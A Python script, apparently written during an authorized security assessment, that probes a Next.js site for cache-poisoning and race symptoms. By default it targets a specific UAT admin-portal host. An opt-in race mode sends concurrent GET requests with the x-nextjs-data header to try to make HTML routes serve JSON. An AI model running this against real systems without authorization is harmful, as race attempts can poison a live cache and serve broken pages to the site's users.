#!/usr/bin/env python3
"""
Next.js race/cache poisoning symptom tester for authorized environments.

Default mode:
- sequential checks only,
- no concurrent race attempt.

Race mode:
- requires --enable-race,
- sends concurrent GET requests only,
- watches for normal HTML routes returning pageProps / __N_REDIRECT JSON or
  content-type/body/hash mismatches.
"""

from __future__ import annotations

import argparse
import concurrent.futures
import hashlib
import html
import json
import re
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request


DEFAULT_ROUTES = [
    "/",
    "/snap",
    "/pwt",
    "/data-platform",
    "/en/data-platform",
    "/fr/data-platform",
    "/data-platform/sigma-api",
    "/en/data-platform/sigma-api",
    "/fr/data-platform/sigma-api",
]


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def make_opener(insecure: bool):
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx), NoRedirect)


def join_url(base: str, path: str) -> str:
    return base.rstrip("/") + (path if path.startswith("/") else "/" + path)


def collapse(text: str, limit: int = 240) -> str:
    return re.sub(r"\s+", " ", text[:limit]).strip()


def fetch(opener, base: str, path: str, *, headers=None, cookie="", timeout=10):
    req_headers = {
        "User-Agent": "authorized-nextjs-race-cache-tester/1.0",
        "Accept": "text/html,application/json,*/*",
    }
    if headers:
        req_headers.update(headers)
    if cookie:
        req_headers["Cookie"] = cookie
    req = urllib.request.Request(join_url(base, path), headers=req_headers, method="GET")
    row = {
        "path": path,
        "status": None,
        "location": None,
        "content_type": None,
        "cache_control": None,
        "x_nextjs_cache": None,
        "body_len": 0,
        "body_sha256_prefix": None,
        "body_preview": "",
        "json_keys": [],
        "page_props_keys": [],
        "json_redirect": None,
        "error": None,
    }
    try:
        with opener.open(req, timeout=timeout) as resp:
            raw = resp.read(500_000)
            update(row, resp, raw)
    except urllib.error.HTTPError as exc:
        raw = exc.read(500_000)
        update(row, exc, raw)
    except Exception as exc:
        row["error"] = f"{type(exc).__name__}: {exc}"
    return row


def update(row, resp, raw: bytes):
    text = raw.decode("utf-8", errors="replace")
    row["status"] = resp.getcode()
    row["location"] = resp.headers.get("Location")
    row["content_type"] = resp.headers.get("Content-Type")
    row["cache_control"] = resp.headers.get("Cache-Control")
    row["x_nextjs_cache"] = resp.headers.get("x-nextjs-cache")
    row["body_len"] = len(raw)
    row["body_sha256_prefix"] = hashlib.sha256(raw).hexdigest()[:16]
    row["body_preview"] = collapse(text)
    if text.lstrip().startswith("{"):
        try:
            parsed = json.loads(text)
        except Exception:
            return
        if isinstance(parsed, dict):
            row["json_keys"] = sorted(parsed.keys())
            pp = parsed.get("pageProps")
            if isinstance(pp, dict):
                row["page_props_keys"] = sorted(pp.keys())
                row["json_redirect"] = pp.get("__N_REDIRECT")


def extract_next_data(text: str):
    match = re.search(r'<script[^>]+id=["\']__NEXT_DATA__["\'][^>]*>(.*?)</script>', text, flags=re.I | re.S)
    if not match:
        return {}
    try:
        return json.loads(html.unescape(match.group(1)))
    except Exception:
        return {}


def detect_build_id(opener, base: str, timeout: int):
    for path in ["/__codex_next_probe_404_4513", "/404", "/terms-and-conditions", "/"]:
        try:
            req = urllib.request.Request(join_url(base, path), headers={"User-Agent": "authorized-nextjs-race-cache-tester/1.0"})
            with opener.open(req, timeout=timeout) as resp:
                text = resp.read(1_000_000).decode("utf-8", errors="replace")
        except urllib.error.HTTPError as exc:
            text = exc.read(1_000_000).decode("utf-8", errors="replace")
        except Exception:
            continue
        data = extract_next_data(text)
        if data.get("buildId"):
            return data.get("buildId"), data
    return "", {}


def data_path(build_id: str, route: str):
    if not build_id:
        return ""
    route = route.split("?", 1)[0]
    if route == "/":
        return f"/_next/data/{build_id}/index.json"
    if "[" in route or "]" in route:
        return ""
    return f"/_next/data/{build_id}/{route.strip('/')}.json"


def html_served_json(row):
    if row["status"] != 200:
        return False
    ct = (row["content_type"] or "").lower()
    preview = row["body_preview"].lstrip()
    return ("json" in ct or preview.startswith("{")) and ("pageProps" in preview or "__N_REDIRECT" in preview)


def cacheable(row):
    cc = (row.get("cache_control") or "").lower()
    if not cc:
        return True
    return not any(x in cc for x in ["no-store", "private", "no-cache", "max-age=0", "must-revalidate"])


def sequential_check(opener, base, route, build_id, cookie, timeout):
    dp = data_path(build_id, route)
    html_row = fetch(opener, base, route, cookie=cookie, timeout=timeout)
    data_row = fetch(opener, base, dp, headers={"x-nextjs-data": "1"}, cookie=cookie, timeout=timeout) if dp else None
    return {
        "route": route,
        "data_path": dp,
        "html_response": html_row,
        "data_response": data_row,
        "html_served_pageprops_json": html_served_json(html_row),
        "html_cacheable": cacheable(html_row),
    }


def race_once(base, route, dp, cookie, timeout, insecure, variant):
    opener = make_opener(insecure)
    if variant == "html":
        return ("html", fetch(opener, base, route, cookie=cookie, timeout=timeout))
    if variant == "data":
        return ("data", fetch(opener, base, dp, headers={"x-nextjs-data": "1"}, cookie=cookie, timeout=timeout))
    if variant == "html_with_data_header":
        return ("html_with_data_header", fetch(opener, base, route, headers={"x-nextjs-data": "1"}, cookie=cookie, timeout=timeout))
    return ("unknown", {"error": "unknown variant"})


def run_race(base, route, dp, cookie, timeout, insecure, workers, iterations):
    hits = []
    samples = []
    variants = ["html", "data", "html_with_data_header"]
    for i in range(iterations):
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            futures = []
            for n in range(workers):
                variant = variants[n % len(variants)]
                futures.append(executor.submit(race_once, base, route, dp, cookie, timeout, insecure, variant))
            for fut in concurrent.futures.as_completed(futures):
                label, row = fut.result()
                if len(samples) < 25:
                    samples.append({"iteration": i, "variant": label, "response": row})
                if label.startswith("html") and html_served_json(row):
                    hits.append({"iteration": i, "variant": label, "response": row})
    return {"route": route, "data_path": dp, "iterations": iterations, "workers": workers, "hit_count": len(hits), "hits": hits, "samples": samples}


def main():
    parser = argparse.ArgumentParser(description="Next.js race/cache poisoning symptom tester")
    parser.add_argument("--base", default="https://uat.adminportal.airmiles.ca")
    parser.add_argument("--route", action="append", default=[])
    parser.add_argument("--build-id", default="")
    parser.add_argument("--cookie", default="")
    parser.add_argument("--enable-race", action="store_true")
    parser.add_argument("--workers", type=int, default=6)
    parser.add_argument("--iterations", type=int, default=20)
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--out", default="work/nextjs_race_cache_results.json")
    parser.add_argument("--insecure", action="store_true")
    args = parser.parse_args()

    opener = make_opener(args.insecure)
    build_id, next_data = detect_build_id(opener, args.base, args.timeout)
    build_id = args.build_id or build_id
    routes = []
    for route in DEFAULT_ROUTES + args.route:
        if route not in routes:
            routes.append(route)

    sequential = [sequential_check(opener, args.base, route, build_id, args.cookie, args.timeout) for route in routes]
    race_results = []
    if args.enable_race:
        for route in routes:
            dp = data_path(build_id, route)
            if dp:
                race_results.append(
                    run_race(
                        args.base,
                        route,
                        dp,
                        args.cookie,
                        args.timeout,
                        args.insecure,
                        args.workers,
                        args.iterations,
                    )
                )

    output = {
        "target": args.base,
        "timestamp_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "build_id": build_id,
        "next_data": {"page": next_data.get("page"), "locales": next_data.get("locales")},
        "authenticated_cookie_supplied": bool(args.cookie),
        "race_enabled": args.enable_race,
        "routes_tested": routes,
        "sequential": sequential,
        "race_results": race_results,
        "sequential_hit_count": sum(1 for x in sequential if x["html_served_pageprops_json"]),
        "race_hit_count": sum(x["hit_count"] for x in race_results),
    }
    with open(args.out, "w", encoding="utf-8") as handle:
        json.dump(output, handle, indent=2)
    print(
        json.dumps(
            {
                "out": args.out,
                "build_id": build_id,
                "race_enabled": args.enable_race,
                "sequential_hit_count": output["sequential_hit_count"],
                "race_hit_count": output["race_hit_count"],
            },
            indent=2,
        )
    )


if __name__ == "__main__":
    main()
